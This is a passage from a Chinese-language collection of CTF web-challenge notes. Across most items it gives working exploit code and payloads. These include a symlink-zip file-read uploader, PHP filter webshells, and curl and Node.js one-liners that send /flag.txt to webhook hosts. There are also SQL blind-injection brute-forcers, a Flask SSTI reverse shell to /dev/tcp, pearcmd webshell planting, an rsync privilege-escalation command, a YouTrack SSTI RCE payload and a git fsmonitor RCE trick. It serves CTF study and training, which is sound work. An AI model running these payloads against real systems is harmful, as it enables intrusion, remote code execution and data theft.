- 软链接zip上传导致的任意文件读取。常出现于以下场景：网站允许上传zip并返回zip压缩的文件的内容。这时就能压缩一个想读取文件路径的软链接，返回的内容就会是想要读取的文件的内容了。
```python
import os
import requests
import sys


def make_zip():
    os.system('ln -s ' + sys.argv[2] + ' test_exp')
    os.system('zip -y test_exp.zip test_exp')


def run():
    make_zip()
    res = requests.post(sys.argv[1], files={'the_file': open('./test_exp.zip', 'rb')})
    print(res.text)

    os.system('rm -rf test_exp')
    os.system('rm -rf test_exp.zip')
run()
```
用法：`python3 s.py http://example/upload /proc/self/environ`。需要在linux环境下运行。
- python的uuid.getnode()方法以48位正整数形式获取硬件地址，也就是服务器的MAC地址。可使用脚本将16进制的mac地址转换为整数：

```python
mac = "76:22:18:a1:3d:35".split(":")
mac_int = [int(i, 16) for i in mac]
mac_bin = [bin(i).replace('0b', '').zfill(8) for i in mac_int]
mac_dec = int("".join(mac_bin), 2)
print(mac_dec)
```

196. [[WMCTF2020]Web Check in 2.0](https://npfs06.top/2021/02/01/%E5%AF%92%E5%81%87buu30%E8%A7%A3%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/)
- php绕过exit：
```php
if(isset($_GET['content'])) {
    $content = $_GET['content'];
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))
         die('hacker');
    if(file_exists($content))
        require_once($content);
    file_put_contents($content,'<?php exit();'.$content);
}
```

[file_put_contents](https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/)支持多个过滤器混用。这里把常用的用于绕过exit的过滤器过滤掉后，还有两种办法。第一种：因为file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以可以利用二次编码绕过。
```
?content=php://filter/write=string.%2572ot13|<?cuc @riny($_TRG[_]);?>/resource=npfs.php 
?content=npfs.php&_=system("ls /");
```

这道题因为会不断执行file_put_contents，所以每个shell只能利用一次，执行一条命令后需要重新上传。第二种：利⽤ zlib 的 zlib.deflate 和 zlib.inflate 来做，中间插⼊string.tolower，把空格和exit处理掉。而插入'%0d'是因为php标签是独立的,需要与php代码分割开。正好%0d是`\r`的url编码，可以用来分割。
```
?content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?%3E%3C?php%0Deval($_POST[pass]);?%3E/resource=shell.php
(post ?content=shell.php)pass=system("ls /");
```
197. [Connect](https://github.com/tamuctf/tamuctf-2023/tree/master/web/connect)
- curl命令注入带出flag的几种方法
```python
command = "curl -s -D - -o /dev/null " + url
print(os.popen(command).read().strip())
```
    - 直接闭合使用shell命令cat出flag：`;cat flag.txt`
    - 闭合后再次使用curl将flag带出到webhook的url上：`; curl -s webhook/$(cat /flag.txt)`
        - 不使用分号闭合：`http://example.com+file:///flag.txt%0a`
        - 使用curl的参数1:`--upload-file /flag.txt {remote_server}`;2:`http://[link-webhook]/?c= -d @/flag.txt`;3:`-d @flag.txt webhook`或`-X POST -d @/flag.txt webhook`
198. [Migraine](https://github.com/tamuctf/tamuctf-2023/tree/master/web/migraine)
- js任意命令执行，但不能包含字母和数字且无回显。无字母数字这点可以用jsfuck绕过，无回显说明要把flag带到webhook上。但jsfuck中不能使用require,因为require只能在module中使用。只能用全局object process（process.mainModule.require）来访问系统api。
```js
var url = "webhook";
var n = 100;
var buffer = Buffer.allocUnsafe(n);
var fs = process.binding('fs');
var path = "flag.txt";
var fd = fs.open(path, 2, 3, 4, 5);
fs.read(fd, buffer, 0, n, 0, 0, 0);
var flag = buffer.toString();
fetch(url + "?flag=" + flag);
```
```js
process.mainModule.require('https').request({
    hostname: 'webhook.site',
    path: '/149f5661-002a-4618-8760-b7f1b8a0a7c4',
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': process.mainModule.require('fs').readFileSync('/flag.txt').toString().length
    }
}).write(process.mainModule.require('fs').readFileSync('/flag.txt').toString())
```
```js
fetch(["https"].concat(atob("Og==")).concat("//enmxw9zlg1zp.x.pipedream.net/data=").concat(process[Object.keys(process)[74]].require(["child"].concat(Object.keys(process)[71][0]).concat("process").join("")).execSync("cat /flag.txt").toString()).join(""))
```
```js
const js = `
import * as fs from 'node:fs';
fs.readFile('/flag.txt', 'utf8', (err, data) => {
  if (err) {
    fetch("https://webhook.site/5fa7108c-ebb7-4e4f-ac39-90118458370b/" + "failed");
    return;
  }
  fetch("https://webhook.site/5fa7108c-ebb7-4e4f-ac39-90118458370b/" + data);
});
`;
// This is a trick to get access to import https://2ality.com/2019/10/eval-via-import.html
const encodedJs = encodeURIComponent(js);
const dataUri = 'data:text/javascript;charset=utf-8,' + encodedJs;
import(dataUri);
```
```js
process.mainModule.require("express").response.send=function(){this.end(process.mainModule.constructor._load("fs").readFileSync("/flag.txt","utf-8"))}
```
- 另一种无字母数字的js写法：https://github.com/mrpapercut/nonalpha-js-obfuscator
199. php文件包含rce。
```php
<?php
include $_REQUEST['file'];
```
当可以完全控制require/include的文件名时，就能使用[PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator)获取rce payload:`python3 filter_chain.py —-chain '<?php system("cat /flag.txt");?>'`。参考[Ghazy Corp](https://hackmd.io/@abdinata/Website-Challenge-0xL4ughCTF-2024),控制file_get_contents的文件名也行。另一篇写的非常详细的[wp](https://siunam321.github.io/ctf/0xL4ugh-CTF-2024/Web/Ghazy-Corp/)。不过这篇wp对file_get_contents的利用比较复杂，不是直接读取文件，而是一点一点像blind oracle一样泄露出来文件内容。或者使用pearcmd.php上传木马getshell：
```sh
curl "http://example.com/?page=/usr/local/lib/php/pearcmd&+-c+/tmp/webshell.php+-d+man_dir=<?echo(system(\$_GET\['cmd'\]));?>+-s+"
curl "http://example.com/?page=/tmp/webshell&cmd=cat+/flag.txt"
```
200. [Logical](https://github.com/tamuctf/tamuctf-2023/tree/master/web/logical)
- sqlite布尔盲注（注意与sql区分，两者很像但脚本不能套用）。
  - 使用LIKE语句。注意`_`符号在sqlite like中匹配任意一个字符，所以要放在字符集最后或是转义。https://stackoverflow.com/questions/7323162/sqlite-like-and
```python
import requests
import string
target = ''
alphabet = string.ascii_letters + string.digits + '{$}#!?<>=*+.(),@^-_'
flag = list('flag{')
while flag[-1] != '}':
    for char in alphabet:
        r = requests.post(target, data={'username': f'admin\' and PASSWORD LIKE BINARY "{"".join(flag)}{char}%"-- '}) 
        if 'not exists' not in r.text:
            flag.append(char)
            print(''.join(flag))
            break
```
- 判断注入目标使用了哪些字符。[escape](https://blog.csdn.net/ameyume/article/details/8007149) 表示转义，直接用反斜杠也行。
```python
def enumerate_characters(charset=printable):
    used_charset = ""
    for char in charset:
        payload = f"admin' and password like '%|{char}%' escape '|"
        response = requests.post(URL, data={"username" : payload})
        
        if response.status_code == 200 and response.json()['res'] == 'exists':
            used_charset += char
       
    return used_charset
```
  - 多线程([concurrent.futures](https://python-parallel-programmning-cookbook.readthedocs.io/zh_CN/latest/chapter4/02_Using_the_concurrent.futures_Python_modules.html))LIKE并转义特殊符号
```python
import string
import urllib.parse
import concurrent.futures
import requests

session = requests.Session()
FLAG = "flag{"

def validate_current_password(char):
    # escape characters used by SQL's LIKE operator
    if char == "%":
        char = "\%"
    elif char == "_":
        char = "\_"
    
    # setting up request
    url = f""
    headers = { "Content-Type": "application/x-www-form-urlencoded" }
    user_input = "admin' AND password LIKE '" + FLAG + char + "%';"
    data = f"username={urllib.parse.quote(user_input)}"
    response = session.post(url, headers=headers, data=data)
    
    # not exists
    if response.status_code != 200:
        return None
    
    content = response.json()["res"]
    if content != "exists":
        return None
    
    # exists
    return char


added = True # check to stop loop when looped all ASCII characters and did not append to flag
# brute force
while not FLAG.endswith("}") and added == True:
    added = False
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(validate_current_password, c) for c in string.printable]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result == None:
                continue
            FLAG += result
            added = True
            print(FLAG)
            executor.shutdown(wait=True, cancel_futures=True)
            break
        
    if added == False:
        break

print(f"Final flag: {FLAG}")
print("Done")
```
  - 使用SUBSTRING+ascii+二分法
```python
import requests
import string

host="" #challange server

false_data = {
        "username":"payload"
}
res = requests.post(host,data=false_data)
false_data = res.json()['res']

burteforce_string = string.printable

def sqli(pos,char):
    data = {
        "username":"admin' and ascii(SUBSTRING((SELECT password FROM users WHERE Username = 'admin'), %d, 1)) > %d#"%(pos,char)
    }
    r = requests.post(host,data=data)
    print(data, r.text)
    result = r.json()['res']

    
    return  result != false_data

def get_char(pos):
    lo, hi = 32, 128
    while lo <= hi: #calculating the first mid
        mid = lo + (hi - lo) 
        if sqli(pos, mid): 
            lo = mid + 1
        else:
            hi = mid - 1
    print(lo)
    return chr(lo)

blacklist_char = "'\""
flag = ''
for pos in range(10, 64):
    flag += get_char(pos)
    print("flag",flag)
```

201. [Flag Fetcher](https://astr.cc/blog/tamuctf-2023-writeup/#flag-fetcher)
- rust [actix-web](https://web.veaba.me/rust/actix-web/)入门。
```rs
#[get("/flag")]
async fn get_flag(){}
```

可以创建一个名为/flag的路由，内部逻辑在get_flag函数中定义。但光定义路由是不够的，还需要将该路由加到App中。如果不加会导致404。
```rs
HttpServer::new(move || {
    App::new()
        .service(get_flag)
})
```
- PathBuf extend函数的错误使用。
```rs
#[get("/static/{filename:.*}")]
async fn static_files(req: HttpRequest) -> Result<fs::NamedFile, Error> {
    let requested: PathBuf = req.match_info().query("filename").parse()?;
    let requested: PathBuf = requested
        .components()
        .filter(|&entry| entry != Component::ParentDir)
        .collect();

    let mut path = PathBuf::from_str("static").unwrap();
    path.extend(&requested);

    let file = fs::NamedFile::open(path)?;
    Ok(file.use_last_modified(true))
}
```
代码使用[PathBuf](https://rustwiki.org/zh-CN/std/path/struct.PathBuf.html )过滤掉`../`，但后续又用extend拼接上用户可控制的filename。extend的[内部](https://doc.rust-lang.org/1.69.0/src/std/path.rs.html#1755-1757)调用了push，而push在遇到绝对路径参数时会替代已有的path，导致路径穿越。因此只需访问`http://example.com/static//key`即可访问根目录下的key文件。

202. [Web LTO](https://astr.cc/blog/tamuctf-2023-writeup/#web-lto)
- 重用文件描述符（reuse file handles/descriptors)的风险。此题实现了下面的逻辑：
    - 用户上传文件，服务器在tmp下打开一个文件
    - seek到temp文件的开头，将内容用tar打包后返回，删除原本文件
漏洞点在于服务器在打开文件时没有考虑重名的问题。假设我们发送了一个持续十秒的post请求，此时有机器人上传flag.txt文件。服务器先打开了代表我们的文件的r+w文件句柄，同时因为文件重名导致服务器重用该文件句柄导致机器人上传的flag覆盖了空白文件。就算后续机器人删除了文件，但我们仍持有r+w的文件句柄，还是可以读文件。
- python实现慢速post。
```python
import requests, time

def generator():
    print("sending multipart header...")
    yield b"--boundary\r\nContent-Disposition: form-data; name=\"a\"; filename=\"flag.txt\"\r\n\r\n"

    print("sleeping...")
    time.sleep(15)

    print("finishing request...")
    yield b"\r\n--boundary--\r\n"

r = requests.post("http://example.com", headers={
    "Content-Type": "multipart/form-data; boundary=boundary"
}, data=generator(), cookies={"whoami": "nobody"})
print(r.text)
```
203. http [range](https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests)字段头.可用于指定下载较大request的哪一部分。https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/64bps
204. [Extract Service 2](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/extract2)
- 软链接（symlink）也可用于docx文件内部。docx文件内部有个word/document.xml，里面记录着word文档的文字。那么将这个文件替换为软链接，就能在服务器提取文字时读取任意文件。
```sh
mkdir word
cd word
ln -s /flag document.xml
cd ../
7z a exploit.zip word
```
205. [certified1](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/certified1)
- rust ImageMagick web应用漏洞：[CVE-2022-44268](https://www.metabaseq.com/imagemagick-zero-days/).当处理png时，可能会导致服务器上的任意文件读取。[poc](https://github.com/voidz0r/CVE-2022-44268)
  - 注意这个漏洞无法读取/proc下的文件，因为/proc下的文件不是真正意义上的文件：https://superuser.com/questions/619955/how-does-proc-work 。所以需要配合题目中自带的其他漏洞：[certified2](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/certified2)
- 不是rust web应用也可以用，参考 https://pegimon.medium.com/tuctf-web-png-and-jelly-sandwich-28b2f0736467 。更多漏洞： https://www.metabaseq.com/imagemagick-zero-days/ ，工具 https://github.com/Sybil-Scan/imagemagick-lfi-poc
206. [Lambda](https://hackmd.io/@Solderet/SomeWriteupForWaniCTF2023-XogSiA#Lambda---web)
- AWS相关考点cheatsheet：https://github.com/pop3ret/AWSome-Pentesting/blob/main/AWSome-Pentesting-Cheatsheet.md
- 此题给出了AWS相关凭证，要求获取其lambda函数(A lambda function is a piece of code that is executed whenever is triggered by an event from an event source)内容。以下代码获取lambda函数名称：
```python
import boto3
from pprint import pprint

access_key_id = 
secret_access_key = #key_id和access_key属于凭证内容
region = #region可以在url里找到。题目发送登陆验证请求时抓包，会看见类似这样的url： https://k0gh2dp2jg.execute-api.ap-northeast-1.amazonaws.com/test 。这个url中ap-northeast-1就是region，k0gh2dp2jg则是API的ID

client = boto3.client(
    "apigateway",
    aws_access_key_id=access_key_id,
    aws_secret_access_key=secret_access_key,
    region_name=region
)

restApiId = client.get_rest_apis()['items'][0]['id']
print("Rest API ID:", restApiId)
resourceId = client.get_resources(restApiId=restApiId)['items'][0]['id']
print("Resource ID:", resourceId)
response = client.get_method(
    restApiId=restApiId,
    resourceId=resourceId,
    httpMethod="GET"
)
pprint(response)
```

获取函数名后就能得到其内容了。
```python
client = boto3.client("lambda",
                      aws_access_key_id=access_key_id,
                      aws_secret_access_key=secret_access_key,
                      region_name=region)

response = client.get_function(FunctionName="wani_function")

pprint(response)
```
官方[wp](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/lambda)给的是命令行的解法。

207. [screenshot](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/screenshot)
- SSRF常出现于服务器访问用户提供的url时。此时可用file://协议读取本地文件。
- js里的req.query.url在名为url的参数有两个时，会返回列表。此处隐藏着parameter type confusion。下面的代码：
```js
if (!req.query.url.includes("http") || req.query.url.includes("file")) {
  res.status(400).send("Bad Request");
  return; 
}
```

要求url参数里包含http且不包含file。可以用`?url=file%3A%2F%2F%2Fflag.txt&url=http`绕过。
- `URLSearchParams.prototype.get()`特性：当多个相同参数被传入url时，会返回第一个。也就是说：
```js
//?url=file%3A%2F%2F%2Fflag.txt&url=http
const params = new URLSearchParams(req.url.slice(req.url.indexOf("?")));
await page.goto(params.get("url"));
//会返回file:///flag.txt
```
- file协议不是大小写敏感的。上面的过滤也可以用`filE:///http/../flag.txt`绕过。
208. [Best_Schools](https://siunam321.github.io/ctf/HeroCTF-v5/Web/Best-Schools/)
- [GraphQL Batching Attack](https://checkmarx.com/blog/didnt-notice-your-rate-limiting-graphql-batching-attack/)利用。在一个request中插入多个query，从而绕过网站自带的rate limit。不仅仅适用于查询用的query，也适用于用于更改数据的mutation query。
```
POST /graphql HTTP/1.1
[
  {
    “variables”: { “id”: 1 },
    “query”: “query User($id: Int!) { … }” //查询的query
  },
  {
    “variables”: { “id”: 2 },
    “query”: "mutation { func(param: \"value\"){id, num} }" //更改数据的mutation query，有点像调用函数
  }
]
```
- 一些graphql入门资料
  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql
  - https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- 利用匿名网络服务tor绕过rate limit：
```sh
while true; do service tor restart; sleep 1; curl --socks5-hostname localhost:9050 -i -s -k -X POST -H $'Content-Type: application/json'  --data-binary $'{\"query\":\"mutation { func(param: \\\"value\\\"){id, num} }\"}' 'http://example.com/graphql';done
```
不断重启tor然后用重启后的tor匿名连接。因为每次匿名连接不会被服务器判断为同一个人，于是绕过limit。
- 直接向console发送mutation query绕过rate limit
```sh
while true; do curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Origin: http://example.com' \
    --data-binary $'{\"query\":\"mutation { func(param: \\\"value\\\"){id, num} func(param: \\\"value\\\"){id, num} }\"}' \
    $'http://example.com/graphql/console'; done
```
209. [Oh sh. Here we go again ?](https://github.com/m4k2/HeroCTF-V5-WU-Foundry/tree/main#challenge-00--oh-sh-here-we-go-again-)
- 题目给出contract被deploy的地址后，可以利用[Foundry](https://learnblockchain.cn/docs/foundry/i18n/zh/getting-started/installation.html)命令cast code获取其bytecode。`cast code <contract addr> --rpc-url $RPC_URL`.其中RPC_URL题目会提供。也可以用node js的web3库
```js
const Web3 = require('web3');
const rpcUrl = ''; // Replace with your custom RPC URL
const web3 = new Web3(rpcUrl);

const contractAddress = ''; // Replace with the address of the contract you want to retrieve bytecode for

web3.eth.getCode(contractAddress, (error, bytecode) => {
  if (error) {
    console.error('Error retrieving contract bytecode:', error);
  } else {
    console.log('Contract bytecode:', bytecode);
  }
});
```
获取的bytecode可以[反编译](https://library.dedaub.com/decompile?md5=911ae673dd624b6cf4924a9acdeef8b0)。
- 调用指定地址的contract的函数。
  - `cast send <addr> <func,exa:0x3c5269d8> --rpc-url $RPC_URL --private-key $PRIVATE_KEY --legacy`.private_key可以通过在另一个窗口运行anvil获取，不过我运行的时候提示gas超了，把gas改高了又有新问题。
  - 使用solidity。用remix释放的话需要有metamask，然后选项里的environment选injected provider,连上自己的provider即可（如metamask）。参考：https://avan.sh/posts/hero-ctf-v5/
```solidity
contract hero2300_pwn
{
    function exploit(address addr) public 
    {
        addr.call(abi.encodeWithSelector(0x3c5269d8));
    }
}
```
- 用python web3和blockchain交互的[课程](https://www.youtube.com/watch?v=UBK2BoFv6Lo&list=PLCwnLq3tOElrubfUWHa1qKrJv1apO8Aag)
210. [Classic one tbh](https://github.com/m4k2/HeroCTF-V5-WU-Foundry/tree/main#challenge-01--classic-one-tbh)
- [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/)漏洞。特征点：合约判断balance的逻辑依赖于`address(this).balance`。该函数会将一个合约从blockchain上删除，并将合约内剩余的全部ether转账到制定地址。可用于给没有实现接收转账功能的合约强行转账。
```
The selfdestruct function in Solidity is used to delete a contract from the blockchain and transfer any remaining ether stored in the contract to a specified address.

The selfdestruct function is a built-in function in Solidity that can be called from a contract to delete itself and transfer its remaining ether balance to a specified address.

The selfdestruct function can also be used maliciously to force ether to be sent to a specific target by creating a contract with a selfdestruct function, sending ether to it, and calling selfdestruct(target).

There are three ways to transfer ether in Solidity: transfer, send, and call.value().gas. Each of these ways requires the target to receive the funds to transfer them to the correct address. However, the selfdestruct function can transfer funds without obtaining the funds first.

To prevent vulnerabilities caused by the selfdestruct function, developers can use a local state variable to update the current balance of the contract when the user deposits funds, instead of using address(this).balance.
```
攻击合约例子：
```solidity
pragma solidity 0.8.17;

contract Selfdestruct{
    constructor() payable{
        require(msg.value == 0.5 ether);
    }

    function kill(address addr) public {
        selfdestruct(payable(addr));
    }
}
```
foundry释放/调用相关命令：
```
forge create selfdestruct.sol:Selfdestruct --value 0.5ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send 0x[Selfdestruct] "kill(address)" 0x[target address] --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```
攻击原理：攻击合约实现了selfdestruct，kill函数的addr填题目的address。这样执行攻击合约的kill函数就会把攻击合约全部的ether转给题目合约。由于题目合约依赖`address(this).balance`计算自身balance，但又有局部变量计算应该有的balance：
```solidity
    function sell(uint256 _amount) external {
        require(userBalances[msg.sender] >= _amount, "Insufficient balance");

        userBalances[msg.sender] -= _amount;
        totalSupply -= _amount;

        (bool success, ) = msg.sender.call{value: _amount * TOKEN_PRICE}("");
        require(success, "Failed to send Ether");
        //getEtherBalance()内部使用address(this).balance
        assert(getEtherBalance() == totalSupply * TOKEN_PRICE);
    }
```
那么assert永远不会通过。

211. [Drink from my Flask #1](https://github.com/HeroCTF/HeroCTF_v5/tree/main/Web/Drink_from_my_Flask_1)
- python flask ssti+key爆破、session伪造
    - 反弹shell payload：`{{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/172.17.0.1/9999 0>&1\"').read() }}`,172.17.0.1换为攻击机器外网ip
    - john爆破session key：`john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256`。format可以根据题目要求更改，如HMAC-MD5。使用[脚本](https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py)将jwt转换为john爆破的目标。
    - 此题的一些unintended solutions：
```
/{{config.update(u=config.update)}}
/{{config.u(g="__globals__)}}
/{{config.u(l=lipsum[config.g])}}
/{{config.u(o=config.l['os'])}}
/{{config.u(p=o.popen)}}
/{{config.u(r=request.args)}}?b=cat+app.py&c=cat+flag.txt
/{{config.p(config.r.b).read()}}
/{{config.p(config.r.c).read()}}
``` 
```py
import requests
req = requests.session()
payload = [
    "/{{config.update(a=config.update)}}",
    "/{{config.a(b=\"__globals__\")}}",
    "/{{config.a(c=lipsum[config.b])}}",
    "/{{config.a(d=config.c.os)}}",
    "/{{config.a(e=config.d.popen)}}",
    "/{{config.a(g='curl server')}}",
    "/{{config.a(h='ipaddr:8080')}}",
    "/{{config.a(i='/a|python3')}}",
    "/{{config.a(j=config.g+config.h)}}",
    "/{{config.a(k=config.j+config.i)}}",
    "/{{config.a(k=config.j+config.i)}}"
]
for x in payload:
    req.get(f"http://xxx.com{x}")
print(req.get("http://xxx.com/{{config.e(config.k).read()}}").text)
```
212. [Referrrrer](https://mxcezl.github.io/posts/write-up/ctf/heroctf-v5/web/referrrrer/)
- express 4.x中，`req.header("Referer")`表示取请求中的Referer字段的值，不过请求传`Referrer`同样可以取到值，两者在源码层面是一样的。而nginx.conf里就不能混用（nginx.conf里看的是`$http_referer`)。
- 根据文档：`CaseSensitive: Disabled by default`,express 4.x里的路径名大小写不敏感。访问`/a`和`/A`是一样的。而nginx里location的配置是大小写敏感的
213. DEX相关概念（[uniswap](https://docs.uniswap.org/contracts/v2/concepts/core-concepts/pools)，[liquidity pool](https://www.youtube.com/watch?v=dVJzcFDo498&list=PLHx4UicbtUoYvCvRouZ4XbaDpE7cbCCqo)）以及题目：
- [blockchain2-4](https://github.com/Kaiziron/heroctf-v5/tree/main).另外这个系列有统一的非预期解：https://github.com/J4X-98/Writeups/blob/main/CTFs/HeroCTF/Chal2_3_4/writeup.md
214. [Blogodogo](https://mxcezl.github.io/posts/write-up/ctf/heroctf-v5/web/blogodogo-2/)
- 对于可以提交任意url的地方，可以使用`javascript:code`来执行任意js代码，不一定要带有payload的http url。如果代码太长，就将代码写为一行，然后base64编码执行。`javascript:eval(atob(base64))`
- python flask里的`SESSION_COOKIE_HTTPONLY = True`配置项表示cookie无法被js代码获取。
- redis缓存（caching）的错误使用。
```py
def profile():
    key_name_url = "profile_" + current_user.username.lower() + "_url"
    key_name_username = "profile_" + current_user.username.lower() + "_username" 
    cache_url, cache_username = redis_client.get(key_name_url), redis_client.get(key_name_username)
    if not cache_url or not cache_username:
        redis_client.set(key_name_username, current_user.username)
        redis_client.expire(key_name_username, 60)
        redis_client.set(key_name_url, current_user.url)
        redis_client.expire(key_name_url, 60)
    cache_url, cache_username = redis_client.get(key_name_url).decode(), redis_client.get(key_name_username).decode()
    return render_template("pages/profile.html", title="My profile", form=form,
        cache_url=cache_url, cache_username=cache_username)
```

该段代码检查访问时是否已有缓存，如果有就直接返回缓存。但`current_user.username.lower()`将任意username全部转为小写。如果注册时不要求统一小写，缓存时却要求，可能导致缓存被投毒。攻击者可注册诸如`ADMIN`的账户，在缓存里存入恶意payload。由于大小写不敏感，真正的admin用户访问自己的缓存时也会出现恶意payload，有xss的风险。

215. [Simple Notes](https://mizu.re/post/simple-notes)
- CORS misconfiguration
```
access-control-allow-credentials: true
access-control-allow-origin: null

Access-Control-Allow-Credentials header value is set to true if the server permits the use of credentials, such as cookies or HTTP authentication, in cross-origin requests. This header is sent as part of the server's response to a preflight request.

Access-Control-Allow-Origin header indicates whether the response can be shared with requesting code from the given origin. If the value of this header is set to * (wildcard), it means any origin can access the resource. If a specific origin is set, only that origin can access the resource. If the value is set to null, it can cause security issues and should be avoided
```
这两个搭在一起容易出现安全问题。第一条允许请求里面包含一些登录时的凭证（credentials，如cookie和这题的authorization）。第二条根据[文档](https://docs.w3cub.com/http/headers/access-control-allow-origin)看似安全，毕竟只允许response与origin为null的网站共享。然而有个问题：`the serialization of the Origin of any resource that uses a non-hierarchical scheme (such as data: or file:) and sandboxed documents is defined to be "null".`。所以可以像下面这样利用iframe获取网站的内容（a sandboxed iframe has a null origin）
```js
var host = "https://example.com"
var ifr  = document.createElement("iframe");
ifr.sandbox = "allow-scripts allow-top-navigation";
ifr.srcdoc  = `<script>
    fetch("${host}/api/me").then(d => d.text()).then((d) => {
        alert(d);
    })
<\x2fscript>`;
document.body.appendChild(ifr);
```
- fetch的重定向特性（仅限chromium浏览器）。假如request字段属于developer-controlled（用户不可控制，例如自己在浏览器里设置等是不行的，必须要开发者用代码设置），重定向时会带着上一次的请求中的这类request。参考：https://github.com/whatwg/fetch/issues/944 。举个例子：现在有个用户，他在A.com下有请求头`Authorization: Bearer xxx`，这个请求头属于developer-controlled。现在将他从A.com重定向的B.com。正常情况下发送给B.com的请求是不会带着`Authorization: Bearer xxx`的，然而如果重定向时用的是fetch，发往B.com的请求就会带着了。注意这个“携带”是拷贝的关系，和当前状态下是否还有这个header没关系。比如假设这个header从localStorage取值，而重定向之前有清空localStorage的逻辑。只要用的是fetch来重定向，这个header的值就会有。
  - 假如要用这个特性泄露header里的内容的话，注意重定向的目标网址要返回有效的CORS。可以用flask搭一个。意味着这类题要有公网ip，而且还要是HTTPS。
```py
from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
cors = CORS(app, resources={
    r"/*": {
        "origins": "*"
    }
}, allow_headers=[
    "Authorization",
    "Content-Type"
], supports_credentials=True)

@app.route("/")
def index():
    print(request.headers)
    return ""

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5555, ssl_context=("cert/cert.pem", "cert/key.pem")) #cert和key这题源码有给，不确定是不是一定要从题目获取
```
216. [YouWatch](https://mizu.re/post/youwatch)
- `<span dangerouslySetInnerHTML={{ __html: `${msg}` }}></span>`允许以html的形式直接插入msg的内容。就算过滤十分严格可能无法直接xss，也可以考虑dom clobbering。
- NextJS DOM Clobbering。似乎是作者自己发现的一个漏洞，详细内容在wp里，尚且不确定是否仅适用于这道题
217. [Drink from my Flask #2](https://github.com/HeroCTF/HeroCTF_v5/tree/main/System/Drink_from_my_Flask_2)
- flaskdev debug console pin码伪造。flaskdev pin码的生成函数与普通flask的生成函数有点不同，多了一个变量。这些变量分别是：
```
probably_public_bits = [
    'flaskdev',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private bits:

mac address的十进制
cat /sys/class/net/eth0/address
python3 -c "print(int('mac'.replace(':',''), 16))"
或者
python3 -c "import uuid;print(str(uuid.getnode()))"

/etc/machine-id拼接/proc/self/cgroup

cat /etc/machine-id
49bab8e92cca463691a8b330fc54cc89
cat /proc/self/cgroup
0::/

如果是上面这种情况的话（第二个文件的斜杠后没有内容），这一栏对应的private element是49bab8e92cca463691a8b330fc54cc89

flaskdev addition。此位为开发者设置，无固定要求
```
脚本在wp里

218. [A woman's weapon](https://v0lk3n.github.io/writeup/HeroCTFv5/HeroCTFv5-SystemCollection#lfm2)
- php 日志文件（log）包含导致LFI->RCE。
- 利用/usr/bin/rsync提权。https://gtfobins.github.io/gtfobins/rsync/ 。首先使用`sudo -l`查看`/usr/bin/rsync`是否具有suid。若有，则可利用该命令将当前用户提权到suid的用户。`sudo -u <suid-user> /usr/bin/rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`
- 利用python命令生成交互shell.`python3 -c 'import pty; pty.spawn("/bin/bash")'`
219. [admin:admin](https://v0lk3n.github.io/writeup/HeroCTFv5/HeroCTFv5-SystemCollection#lfm3)
- YouTrack SSTI漏洞：[CVE-2021-25770](https://www.synacktiv.com/en/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html).payload:
```
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cmd")}
```
220. [I use ZSH btw](https://github.com/HeroCTF/HeroCTF_v5/tree/main/Misc/I_Use_Zsh_Btw)
- 利用`.git`文件夹内的config文件的fsmonitor实现RCE。 https://www.youtube.com/watch?v=kjIGfOgh3UI&t=18708s 。适用于zsh，fish等使用git module的shell。这些类型的shell内部使用git module执行以下操作：
  - git status
  - parse `.git/config`文件
  - 在config里寻找fsmonitor选项并执行.fsmonitor用于更改获取两个git版本区别的diff可执行文件，问题在于可以随便改，自然就能RCE了
- shell将具有以下内容的文件夹看作有效的`.git`文件夹：
  - HEAD文件
  - config文件（也是插入payload的地方）
  - objects和refs文件夹。这两个文件夹可以是空的，但是必须要有
221. [[GKCTF 2021]CheckBot](https://blog.csdn.net/cjdgg/article/details/121504021)
- xss（或者csrf？）假设可以将任意url发送给admin bot，以下为本地服务器部署的提取flag的html。
```html
<html>
        <body>
                <iframe id="flag" src="想要admin访问的有flag的url"></iframe>
                <script>
                        window.onload = function(){
                        let flag = document.getElementById("flag").contentWindow.document.getElementById("flag").innerHTML;
                        var exportFlag = new XMLHttpRequest();
                        exportFlag.open('get', '公网ip服务器url/flagis-' + window.btoa(flag));
                        exportFlag.send();
                        }
                </script>
        </body>
</html>
```
